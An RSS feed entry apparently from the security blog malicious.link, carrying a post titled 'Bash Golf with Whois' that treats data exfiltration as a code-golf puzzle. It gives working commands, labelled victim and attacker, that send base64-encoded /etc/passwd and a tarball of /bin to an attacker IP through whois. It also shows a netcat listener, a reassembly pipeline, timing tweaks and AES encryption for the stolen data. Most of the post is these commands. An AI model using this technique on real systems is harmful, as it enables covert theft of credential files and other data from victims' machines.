<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>tee on malicious.link</title>
    <link>/tags/tee/</link>
    <description>Recent content in tee on malicious.link</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 20 May 2019 09:30:44 -0500</lastBuildDate>
    
        <atom:link href="/tags/tee/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Bash Golf with Whois</title>
      <link>/post/2019/bash-golf-with-whois/</link>
      <pubDate>Mon, 20 May 2019 09:30:44 -0500</pubDate>
      
      <guid>/post/2019/bash-golf-with-whois/</guid>
      <description>

&lt;p&gt;If you have never played Code Golf before, the essential idea is that you take a programming goal, such as &amp;ldquo;&lt;a href=&#34;https://code-golf.io/prime-numbers&#34;&gt;Print all prime numbers from 1 to 100&lt;/a&gt;&amp;rdquo;, and then try to do so in the most efficient / least amount of lines possible.&lt;/p&gt;

&lt;p&gt;There is a great website where these challenges can be found: &lt;a href=&#34;https://code-golf.io/&#34;&gt;https://code-golf.io/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I enjoy playing code golf, so when I saw the following tweet, I had to try it out:&lt;/p&gt;

&lt;p&gt;The tweet 1102558893513687040 from &lt;a href=&#34;https://twitter.com/Kevin2600&#34;&gt;@Kevin2600&lt;/a&gt; was deleted but it had the following commands in the image: (making up an IP since it was blacked out):&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Victim&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;whois -h 10.110.10.81 -p 4444 `cat /etc/passwd | base64`
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;nc -l -p 4444
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, a lot of respondents mentioned that you could use the &lt;code&gt;/dev/tcp&lt;/code&gt; method or &lt;code&gt;awk&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;blockquote class=&#34;twitter-tweet&#34; data-conversation=&#34;none&#34; data-lang=&#34;en&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;Why whois?&lt;br&gt;&lt;br&gt;TCP&lt;a href=&#34;https://t.co/6UstTUeJ4M&#34;&gt;https://t.co/6UstTUeJ4M&lt;/a&gt;&lt;br&gt;&lt;br&gt;awk&lt;a href=&#34;https://t.co/QlCoAXFvKh&#34;&gt;https://t.co/QlCoAXFvKh&lt;/a&gt;&lt;br&gt;&lt;br&gt;Much easier and faster!&lt;/p&gt;&amp;mdash; Malwrologist (@DissectMalware) &lt;a href=&#34;https://twitter.com/DissectMalware/status/1102781062911066112?ref_src=twsrc%5Etfw&#34;&gt;March 5, 2019&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;While this is awesome and true, and for practicality should be used instead of &lt;code&gt;whois&lt;/code&gt;,  it is more about the mental stretch and exercise for me. You never know, there might a situation where you can&amp;rsquo;t use either of those and &lt;code&gt;whois&lt;/code&gt; is still there.&lt;/p&gt;

&lt;p&gt;This is the solution I came up with to both increase the file size limit, and add a bit of error correction:&lt;/p&gt;

&lt;p&gt;(Here is my reply: &lt;a href=&#34;https://twitter.com/mubix/status/1102780435271176198&#34;&gt;https://twitter.com/mubix/status/1102780435271176198&lt;/a&gt;)&lt;/p&gt;

&lt;h3 id=&#34;first-we-set-up-a-listener&#34;&gt;First we set up a listener:&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;root@attackbox:~# ncat -k -l -p 4444 | tee files.b64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;tee&lt;/code&gt; is used to pipe the contents to a file as well as see it on the console so you can make sure you have it. You can substitute this with just &lt;code&gt;&amp;gt; files.b64&lt;/code&gt; if you wish.&lt;/p&gt;

&lt;p&gt;Options:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-k&lt;/code&gt;: means keep the connection open. We need this option as we are going to be doing many requests with &lt;code&gt;whois&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-l&lt;/code&gt;: listen on a port.. and&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p&lt;/code&gt;: what port to listen on&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;next-we-send-the-files-over-the-wire&#34;&gt;Next we send the files over the wire:&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;root@victim:~# tar czf - /bin/* | base64 | xargs -I bits timeout 0.03 whois -h 192.168.80.107 -p 4444 bits
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Breakdown:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;tar czf - /bin/*&lt;/code&gt;: Create a &lt;code&gt;tar&lt;/code&gt; ball using compression(&lt;code&gt;c&lt;/code&gt;), and gzip(&lt;code&gt;z&lt;/code&gt;) to the file(&lt;code&gt;f&lt;/code&gt;) of standard output(&lt;code&gt;-&lt;/code&gt;) using all of the files in the &lt;code&gt;bin&lt;/code&gt; folder (&lt;code&gt;/bin/*&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;base64&lt;/code&gt;: Base64 encode that standard output&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xargs -I bits&lt;/code&gt;: for every line do the following command while replacing the word &lt;code&gt;bits&lt;/code&gt; in the command with the contents of the preceding lines (from the base64)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;timeout 0.03&lt;/code&gt;: This times out the &lt;code&gt;whois&lt;/code&gt; command so that it closes the connection because there isn&amp;rsquo;t a response from the other end (it&amp;rsquo;s just capturing packets). This is REALLY fast and only should be used in LAN connections. Set the timeout to &lt;code&gt;0.10&lt;/code&gt; or similar for doing things across the Internet.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;whois -h 192.168.80.107 -p 4444 bits&lt;/code&gt;: Send the &lt;code&gt;bits&lt;/code&gt;(which is replaced with the base64 line) &lt;code&gt;whois&lt;/code&gt; query to &lt;code&gt;192.168.80.107&lt;/code&gt; over port &lt;code&gt;4444&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What you should see on the attacker side is a bunch of Base64 lines scrolling across the screen.&lt;/p&gt;

&lt;h3 id=&#34;finally&#34;&gt;Finally:&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;root@attackbox:~# cat files.b64 | tr -d &#39;\r\n&#39; | base64 -d | tar zxv
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Breakdown:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cat files.b64&lt;/code&gt;: print all the base64 lines to standard output&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tr -d &#39;\r\n&#39;&lt;/code&gt;: remove all the newlines and returns to make one long base64 line to decode&lt;/li&gt;
&lt;li&gt;&lt;code&gt;base64 -d&lt;/code&gt;: decode the base64 line&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tar zxv&lt;/code&gt;: &lt;code&gt;x&lt;/code&gt; extract the tar ball using &lt;code&gt;z&lt;/code&gt; gzip and be &lt;code&gt;v&lt;/code&gt; verbose about it.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;errors&#34;&gt;Errors:&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;If you receive a &lt;code&gt;base64: invalid input&lt;/code&gt; when doing the final step it is most likely that your timeout was too fast and some of the lines didn&amp;rsquo;t transfer completely.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;If you get something like the following you have had some corruption during the transfer. This can happen and does so a lot during such a long transfer (13 MB took 98 minutes as you&amp;rsquo;ll see below).&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;bin/bash
bin/brltty

gzip: stdin: invalid compressed data--format violated
tar: Unexpected EOF in archive
tar: Unexpected EOF in archive
tar: Error is not recoverable: exiting now
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;improvements&#34;&gt;Improvements:&lt;/h3&gt;

&lt;h4 id=&#34;speed&#34;&gt;Speed:&lt;/h4&gt;

&lt;p&gt;One improvement to the speed is the number of bytes you send with each &lt;code&gt;whois&lt;/code&gt; request, which is based on the line length of the base64 output with the &lt;code&gt;-w&lt;/code&gt; flag. I have been able to increase this to 255 without much trouble like so: &lt;code&gt;base64 -w255&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar czf - /bin/* | base64 -w255 | xargs -I bits timeout 0.20 whois -h 192.168.80.107 -p 4444 bits
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Even with this speed up sending all of &lt;code&gt;/bin/&lt;/code&gt; took 98 minutes using a timeout of &lt;code&gt;0.20&lt;/code&gt;. You can decrease this considerably depending on the network connection you have between the victim and attackerbox, but you need to be careful or you&amp;rsquo;ll end up with corrupted data if you go too fast.&lt;/p&gt;

&lt;p&gt;Size of &lt;code&gt;/bin/&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@victim:~# du -h /bin/
13M     /bin/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Total time:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@victim:~# time tar czf - /bin/* | base64 -w 255 | xargs -I bits timeout 0.20 whois -h 192.168.80.107 -p 4444 bits

real    98m7.673s
user    1m25.792s
sys     0m46.706s
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;encryption&#34;&gt;Encryption:&lt;/h4&gt;

&lt;p&gt;While adding encryption will add more complexity and size to the transfer it will ensure confidentiality of the data being transfered. Simply adding &lt;code&gt;openssl enc -e -aes256 -out -&lt;/code&gt; to the line before the &lt;code&gt;base64&lt;/code&gt; works to solve this (as long as you select a good password). You will also need a full TTY (interactive terminal) to do this as it will prompt you for a password twice.&lt;/p&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar czf - /bin/* | openssl enc -e -aes256 -out - | base64 -w 255 | xargs -I bits timeout 0.20 whois -h 192.168.80.107 -p 4444 bits
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;challenge&#34;&gt;Challenge&lt;/h2&gt;

&lt;p&gt;Think you can make this more efficient? Add error correction? I would love to see tweets or comments stating where this can be improved using only built in binaries (no python/ruby/perl/awk). Let me know! I look forward to hearing from you.&lt;/p&gt;

&lt;h2 id=&#34;other-methods&#34;&gt;Other methods&lt;/h2&gt;

&lt;p&gt;For those looking for a lot more file uploads or other such exploitation techniques, check out &lt;a href=&#34;https://gtfobins.github.io/&#34;&gt;GTFOBins&lt;/a&gt; and in particular &lt;a href=&#34;https://gtfobins.github.io/#+file%20upload&#34;&gt;https://gtfobins.github.io/#+file%20upload&lt;/a&gt;. &lt;code&gt;whois&lt;/code&gt; is detailed here: &lt;a href=&#34;https://gtfobins.github.io/gtfobins/whois/&#34;&gt;https://gtfobins.github.io/gtfobins/whois/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
